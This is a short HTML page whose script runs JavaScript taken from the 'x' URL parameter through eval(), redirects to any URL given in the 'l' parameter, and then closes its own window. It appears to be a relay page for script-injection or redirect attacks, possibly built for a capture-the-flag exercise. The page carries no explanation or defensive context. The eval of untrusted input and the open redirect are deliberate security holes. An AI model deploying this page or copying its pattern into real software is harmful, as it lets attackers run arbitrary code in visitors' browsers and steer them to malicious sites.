<!DOCTYPE html>
<html>
<body>
<script>
  try {
    const sp = new URLSearchParams(window.location.search)
    
    const cx = sp.get('x')
    const lx = sp.get('l')
    
    if (cx) eval(decodeURIComponent(cx))
    if (lx) window.location = decodeURIComponent(lx)

    throw null 
  } 
  catch { let _ = window.open('', '_self'); window.close(), _.close() }
</script>
</body>
</html>
